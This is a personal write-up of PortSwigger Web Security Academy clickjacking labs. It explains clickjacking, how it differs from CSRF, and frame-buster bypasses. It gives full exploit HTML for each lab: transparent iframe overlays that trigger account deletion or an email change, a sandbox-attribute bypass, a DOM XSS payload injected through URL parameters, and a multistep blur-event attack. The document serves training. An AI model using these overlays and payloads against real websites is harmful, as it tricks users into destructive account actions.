# PortSwigger-Clickjacking
## What's clickjacking
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website

Clickjacking misconception:
- Incorrect mental model: The fake site is on the bottom, with a malicious trap overlaying it on top.

- The actual reality: The decoy (fake) site is at the bottom to trick the user into clicking, while the sensitive real site (bank, account settings, etc.) sits directly on top inside a completely invisible iframe to capture that click.

While the user’s eyes see and intend to interact with the decoy site displayed beneath, their mouse click actually hits the authentic site hidden directly above it via transparent CSS (opacity: 0).
## Clickjacking vs CSRF
This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input. 

Protection against CSRF attacks is often provided by the use of a CSRF token: a session-specific, single-use number or nonce. Clickjacking attacks are not mitigated by the CSRF token as a target session is established with content loaded from an authentic website and with all requests happening on-domain. CSRF tokens are placed into requests and passed to the server as part of a normally behaved session. The difference compared to a normal user session is that the process occurs within a hidden iframe. 

## How to construct a basic clickjacking attack
Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website.

The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values.
### Lab: Basic clickjacking with CSRF token protection
The only thing hard about this thing is to align the button (you can use other elements) with the `Delete account` button in `/my-account` page
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    #target_website {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.5;
      z-index: 2;
    }

    div {
      position: absolute;
      top: 560px;
      left: 60px;
      z-index: 1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    click
  </div>
  <iframe src="https://0ae4008d03c8238680b46c3b00520004.web-security-academy.net/my-account"
    id="target_website"></iframe>
</body>

</html>
```


### Lab: Clickjacking with form input data prefilled from a URL parameter
Some websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission. Other websites might require text before form submission. As GET values form part of the URL then the target URL can be modified to incorporate values of the attacker's choosing and the transparent "submit" button is overlaid on the decoy site as in the basic clickjacking example. 

In this lab, the web application allows autofilling form input through URL param. We will make use of that combine with clickjacking the user to push the `Update email` button, thus changing the victim's email
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    #target_website {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.5;
      z-index: 2;
    }

    div {
      position: absolute;
      top: 560px;
      left: 60px;
      z-index: 1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    click
  </div>
  <iframe src="https://0ae4008d03c8238680b46c3b00520004.web-security-academy.net/my-account?email=whateveruwant@gmail.com"
    id="target_website"></iframe>
</body>

</html>
```
## Frame busting scripts
Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

- check and enforce that the current application window is the main or top window,
- make all frames visible,
- prevent clicking on invisible frames,
- intercept and flag potential clickjacking attacks to the user.

Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site. 

__Why this is shit:__

When an attacker embeds the victim's site using the sandbox attribute. the broswer isolates the iframe under strict security constraints. This (and the `allow-forms/scripts` attribute) leads to two things:
1. Top-level Navigation is restricted:

- Because the attacker deliberately omits allow-top-navigation, the browser strictly prohibits any JavaScript inside the iframe from modifying the top-level window's URL (top.location).

- When the Frame Buster executes top.location = self.location, the browser blocks the operation and throws a Security Error (DOMException: Blocked a frame with origin from accessing a cross-origin frame).

2. Core functionality for the attack remains intact:

- allow-scripts: Allows the victim page to run internal JavaScript (if needed).

- allow-forms: Allows form submissions inside the iframe.

- Omitted allow-top-navigation: Neutralizes the Frame Buster's ability to redirect the top window.



Takeaway: Client-side JavaScript protections (Frame Busters) are fragile and easily bypassed. Modern security relies on Server-side HTTP Response Headers like `Content-Security-Policy: 'frame-ancestors'` or `X-Frame-Options` instead of relying on JavaScript.
### Lab:
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    #target_website {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.5;
      z-index: 2;
    }

    div {
      position: absolute;
      top: 480px;
      left: 60px;
      z-index: 1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    click
  </div>
  <iframe src="https://0aee006304f9a3ff804303c1009200b1.web-security-academy.net/my-account?email=h3llo@gmail.com"
    id="target_website" sandbox="allow-scripts"></iframe>
</body>

</html>
```


### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

In XSS Labs, PortSwigger sets up for us so that the victim automatically click the injection place and execute the script. Now we have to do it by ourself, using Clickjacking. Notice that in the submit feedback fuctionality contains an XSS vuln. The sink is in the displayFeedback function, where it uses innerHTML to display name of the feedback person.
```js
function displayFeedbackMessage(name) {
    return function() {
        var feedbackResult = document.getElementById("feedbackResult");
        if (this.status === 200) {
            feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
            feedbackForm.reset();
        } else {
            feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
        }
    }
}
```

Autofilling the submit feedback form via URL and inject the XSS payload in the Name field. Since this is innerTHML, `<script>` tag is not allowed, but we have many other ways to circumvent the policy.
```html
<img src=1 onload=print()>
```
__Final payload__
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    #target_website {
      position: relative;
      width: 500px;
      height: 900px;
      opacity: 0.5;
      z-index: 2;
    }

    div {
      position: absolute;
      top: 870px;
      left: 60px;
      z-index: 1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    click
  </div>
  <iframe id="target_website"
    src="https://0a7600a303b095b98343108800900015.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=123@gmail.com&subject=hallo&message=qwertyuiop#feedbackResult"></iframe>
</body>

</html>
```
### Lab: Multistep clickjacking
To solve this lab, there are many approaches: move the button, move the decoy frame, move the victim frame, using multiple frame.... I chose move the decoy frame since I think its the easiest

When you click on the iframe for the first time, the decoy website will not be focused on anymore, causing the `blur` event. You just need to add an event listener to move the iframe up right to fit the confirmation button.
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    #target_website {
      position: relative;
      width: 500px;
      height: 700px;
      opacity: 0.5;
      z-index: 2;
    }

    #decoy_website {
      position: absolute;
      top: 500px;
      left: 60px;
      z-index: 1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    click
  </div>
  <iframe src="https://0ab1008b0435082f80c6446c00e50041.web-security-academy.net/my-account"
    id="target_website"></iframe>
  <script>
    window.addEventListener('blur', () => {
        const frame = document.querySelector("#target_website");
        frame.style.top = "200px";
        frame.style.left = "-140px";
    });
  </script>
</body>

</html>
```
